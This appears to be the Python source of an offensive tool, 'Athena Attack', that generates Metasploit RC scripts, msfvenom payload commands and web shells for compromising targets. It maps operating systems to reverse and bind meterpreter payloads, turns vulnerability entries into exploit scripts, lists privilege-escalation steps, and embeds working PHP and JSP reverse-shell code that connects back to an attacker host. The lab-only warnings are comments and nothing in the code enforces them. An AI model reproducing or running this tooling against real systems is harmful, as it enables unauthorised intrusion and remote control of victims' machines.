"""
Athena Attack — Payload Builder
Generates Metasploit RC scripts, msfvenom commands, and web shells.
All output is configuration — no active connections are made here.

Linux/cross-platform compatible.
"""

import datetime
import os
import sys
import shutil

# ─── Platform Detection ──────────────────────────────────────────────────────

IS_LINUX   = sys.platform.startswith("linux")
IS_WINDOWS = sys.platform.startswith("win")
IS_MAC     = sys.platform.startswith("darwin")

def check_tool(name):
    """Return True if `name` is found on PATH (Linux/Mac/Windows compatible)."""
    return shutil.which(name) is not None

# ─── OS → Payload Map ─────────────────────────────────────────────────────────

PAYLOAD_MAP = {
    "windows/x64": {
        "meterpreter_reverse": "windows/x64/meterpreter/reverse_tcp",
        "meterpreter_https":   "windows/x64/meterpreter/reverse_https",
        "bind":                "windows/x64/meterpreter/bind_tcp",
        "shell_reverse":       "windows/x64/shell/reverse_tcp",
    },
    "windows/x86": {
        "meterpreter_reverse": "windows/meterpreter/reverse_tcp",
        "meterpreter_https":   "windows/meterpreter/reverse_https",
        "bind":                "windows/meterpreter/bind_tcp",
        "shell_reverse":       "windows/shell/reverse_tcp",
    },
    "linux/x86_64": {
        "meterpreter_reverse": "linux/x64/meterpreter/reverse_tcp",
        "meterpreter_https":   "linux/x64/meterpreter_reverse_https",
        "bind":                "linux/x64/meterpreter/bind_tcp",
        "shell_reverse":       "linux/x64/shell/reverse_tcp",
    },
    "linux/x86": {
        "meterpreter_reverse": "linux/x86/meterpreter/reverse_tcp",
        "bind":                "linux/x86/meterpreter/bind_tcp",
        "shell_reverse":       "linux/x86/shell/reverse_tcp",
    },
}

MSFVENOM_FORMAT_MAP = {
    "exe":  {"format": "exe",            "platform": "windows", "arch": "x64"},
    "elf":  {"format": "elf",            "platform": "linux",   "arch": "x64"},
    "py":   {"format": "raw",            "platform": "python",  "arch": ""},
    "ps1":  {"format": "psh-reflection", "platform": "windows", "arch": "x64"},
    "php":  {"format": "raw",            "platform": "php",     "arch": ""},
    "c":    {"format": "c",              "platform": "linux",   "arch": "x64"},
}

# ─── Path Resolution ─────────────────────────────────────────────────────────
# Anchored to the file's own directory so the tool works when launched
# from any working directory (common on Linux: `python /opt/athena/attack.py`)

_BASE_DIR  = os.path.dirname(os.path.abspath(__file__))
_SPOOL_DIR = os.path.join(_BASE_DIR, "reports")

# ─── RC Script Header/Footer ──────────────────────────────────────────────────

def _rc_header(label, target):
    ts         = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    safe_label = label.replace(' ', '_').lower()
    # Always use forward slashes in the RC spool path — msfconsole runs on
    # Linux and expects POSIX paths; on Windows os.path.join uses backslashes
    # so we normalise explicitly.
    spool_path = os.path.join(_SPOOL_DIR, f"athena_attack_{safe_label}.log")
    spool_path = spool_path.replace("\\", "/")
    return f"""# ═══════════════════════════════════════════════════════
# Athena Attack Mode — {label}
# Target   : {target}
# Generated: {ts}
# WARNING  : Authorised home lab use only
# ═══════════════════════════════════════════════════════

spool {spool_path}

"""

def _rc_footer():
    return """
# ─── Session Management ────────────────────────────────
# sessions -l              → list active sessions
# sessions -i <ID>         → interact with session
# sessions -u <ID>         → upgrade shell to meterpreter
# background               → background current session
"""

# ─── Builder Class ────────────────────────────────────────────────────────────

class PayloadBuilder:

    def __init__(self):
        # Warn once if msfvenom is not on PATH (common on non-Kali Linux)
        if not check_tool("msfvenom"):
            print("\033[93m[!]  msfvenom not found on PATH. Install Metasploit Framework:\033[0m")
            if IS_LINUX:
                print("\033[93m     sudo apt install metasploit-framework   # Debian/Ubuntu/Kali\033[0m")
                print("\033[93m     curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod +x msfinstall && ./msfinstall\033[0m")

    def meterpreter_reverse(self, target, lhost, lport, target_os, exploit_module):
        payload = PAYLOAD_MAP.get(target_os, PAYLOAD_MAP["windows/x64"])["meterpreter_reverse"]
        rc = _rc_header("Meterpreter Reverse Shell", target)
        rc += f"""# ── Stage 1: Exploit ──────────────────────────────────
use {exploit_module}
set RHOSTS {target}
set LHOST {lhost}
set LPORT {lport}
set PAYLOAD {payload}
set ExitOnSession false
set VERBOSE true

# ── Stage 2: Handler ──────────────────────────────────
# (If using exploit/multi/handler, the above IS the handler)
# For other exploits, add exploit-specific options below:
# set TARGETURI /
# set RPORT 80

exploit -j

# ── Stage 3: Post-session hints ───────────────────────
# Once session opens, interact and run:
#   sysinfo
#   getuid
#   getsystem
#   run post/multi/recon/local_exploit_suggester

"""
        rc += _rc_footer()
        return rc

    def bind_shell(self, target, lport, target_os, exploit_module):
        payload = PAYLOAD_MAP.get(target_os, PAYLOAD_MAP["windows/x64"])["bind"]
        rc = _rc_header("Bind Shell", target)
        rc += f"""# ── Bind Shell Config ─────────────────────────────────
# Note: Bind shells connect TO the target's open port.
# No LHOST needed — target listens, you connect.

use {exploit_module}
set RHOSTS {target}
set RPORT {lport}
set PAYLOAD {payload}
set ExitOnSession false

exploit -j

# ── Connect to bind shell ──────────────────────────────
# After exploit: sessions -l to see session
# Or manually:  nc {target} {lport}

"""
        rc += _rc_footer()
        return rc

    def web_shell(self, target, port, webroot, shell_type, lhost, lport):
        ts       = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"athena_shell_{ts}.{shell_type}"

        if shell_type == "php":
            shell_code = self._php_shell(lhost, lport)
            payload    = "php/meterpreter/reverse_tcp"
        elif shell_type == "aspx":
            shell_code = self._aspx_shell(lhost, lport)
            payload    = "windows/x64/meterpreter/reverse_tcp"
        elif shell_type == "jsp":
            shell_code = self._jsp_shell(lhost, lport)
            payload    = "java/meterpreter/reverse_tcp"
        else:
            shell_code = self._php_shell(lhost, lport)
            payload    = "php/meterpreter/reverse_tcp"
            filename   = f"athena_shell_{ts}.php"

        rc = _rc_header("Web Shell Handler", target)
        rc += f"""# ── Web Shell Listener ────────────────────────────────
# Shell file : {filename}
# Upload to  : {webroot}/{filename}
# Trigger    : http://{target}:{port}/{filename}

use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false

exploit -j

"""
        rc += _rc_footer()
        return rc, shell_code, filename

    def msfvenom_payload(self, target_os, lhost, lport, fmt, outfile, encoder="", iterations="1"):
        fmt_info = MSFVENOM_FORMAT_MAP.get(fmt, MSFVENOM_FORMAT_MAP["exe"])
        payload  = PAYLOAD_MAP.get(target_os, PAYLOAD_MAP["windows/x64"])["meterpreter_reverse"]

        if fmt == "php":
            payload = "php/meterpreter/reverse_tcp"
        elif fmt == "py":
            payload = "python/meterpreter/reverse_tcp"

        parts = ["msfvenom"]
        parts += [f"-p {payload}"]
        parts += [f"LHOST={lhost}", f"LPORT={lport}"]
        if fmt_info["platform"]:
            parts += [f"--platform {fmt_info['platform']}"]
        if fmt_info["arch"]:
            parts += [f"-a {fmt_info['arch']}"]
        if encoder:
            parts += [f"-e {encoder}", f"-i {iterations}"]
        parts += [f"-f {fmt_info['format']}"]
        parts += [f"-o {outfile}"]

        # Use Linux line continuation by default; readable on all platforms
        cmd = " \\\n    ".join(parts)

        rc = _rc_header("msfvenom Payload Handler", f"LHOST:{lhost} LPORT:{lport}")
        rc += f"""# ── Generated payload: {outfile} ──────────────────────
# Generate command (run in a terminal, NOT inside msfconsole):
#
#   {cmd.replace(chr(10)+'    ', ' ')}
#
# ── Start handler ─────────────────────────────────────
use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
set AutoRunScript post/multi/manage/shell_to_meterpreter

exploit -j

"""
        rc += _rc_footer()
        return cmd, rc

    def from_vuln(self, vuln, target, lhost, lport, target_os):
        """Build RC script from a Chase vulnerability entry."""
        msf_module = vuln.get("msf_module", "exploit/multi/handler")
        msf_cmds   = vuln.get("msf_commands", [])
        payload    = PAYLOAD_MAP.get(target_os, PAYLOAD_MAP["windows/x64"])["meterpreter_reverse"]

        rc = _rc_header(vuln.get("vulnerability", "Chase Exploit"), target)
        rc += f"""# ── Vulnerability: {vuln.get('vulnerability','')} ──
# CVE      : {vuln.get('cve','N/A')}
# Severity : {vuln.get('severity','N/A')}
# CVSS     : {vuln.get('cvss','N/A')}
#
# ── Pre-run checks ────────────────────────────────────
# Confirm target is vulnerable before running:
"""
        if "exploit/" in msf_module:
            scanner = msf_module.replace("exploit/", "auxiliary/scanner/")
            rc += f"# use {scanner}\n# set RHOSTS {target}\n# run\n#\n"

        rc += f"\n# ── Exploit ───────────────────────────────────────────\n"

        if msf_cmds:
            for cmd in msf_cmds:
                line = cmd.replace("<target_ip>", target).replace("<your_ip>", lhost)
                rc += f"{line}\n"
            if "PAYLOAD" not in " ".join(msf_cmds):
                rc += f"set PAYLOAD {payload}\n"
            if "LHOST" not in " ".join(msf_cmds):
                rc += f"set LHOST {lhost}\n"
            if "LPORT" not in " ".join(msf_cmds):
                rc += f"set LPORT {lport}\n"
        else:
            rc += f"use {msf_module}\n"
            rc += f"set RHOSTS {target}\n"
            rc += f"set LHOST {lhost}\n"
            rc += f"set LPORT {lport}\n"
            rc += f"set PAYLOAD {payload}\n"

        rc += f"\nexploit -j\n"

        manual = vuln.get("manual_steps", [])
        if manual:
            rc += "\n# ── Manual fallback steps ────────────────────────────\n"
            for step in manual:
                rc += f"# {step}\n"

        rc += _rc_footer()
        return rc

    # ─── Shell Code Generators ────────────────────────────────────────────────
    # Note: lhost and lport are embedded directly into shell code.
    # Callers MUST pre-validate lhost via validate_ip() and lport via
    # validate_port() before invoking these methods.

    def _php_shell(self, lhost, lport):
        return f"""<?php
// Athena Web Shell — PHP Meterpreter
// For authorised lab use only
set_time_limit(0);
$ip   = '{lhost}';
$port = {lport};
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0=>$sock,1=>$sock,2=>$sock), $pipes);
?>"""

    def _aspx_shell(self, lhost, lport):
        return f"""<%@ Page Language="C#" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
// Athena Web Shell — ASPX Reverse Shell
// For authorised lab use only
using(TcpClient client = new TcpClient("{lhost}", {lport}))
using(NetworkStream ns = client.GetStream())
{{
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.RedirectStandardInput  = true;
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.RedirectStandardError  = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    // pipe streams omitted — complete before deploying
}}
%>"""

    def _jsp_shell(self, lhost, lport):
        return f"""<%@ page import="java.io.*,java.net.*" %>
<%
// Athena Web Shell — JSP Reverse Shell
// For authorised lab use only
String host = "{lhost}";
int port    = {lport};
String[] cmd = new String[]{{"/bin/bash","-i"}};
Process p = Runtime.getRuntime().exec(cmd);
Socket s   = new Socket(host, port);
InputStream  pi = p.getInputStream(),  pe = p.getErrorStream(), si = s.getInputStream();
OutputStream po = p.getOutputStream(), so = s.getOutputStream();
while(!s.isClosed()){{
    while(pi.available()>0) so.write(pi.read());
    while(pe.available()>0) so.write(pe.read());
    while(si.available()>0) po.write(si.read());
    so.flush(); po.flush();
    Thread.sleep(50);
    if(p.exitValue()>=0) break;
}}
p.destroy(); s.close();
%>"""
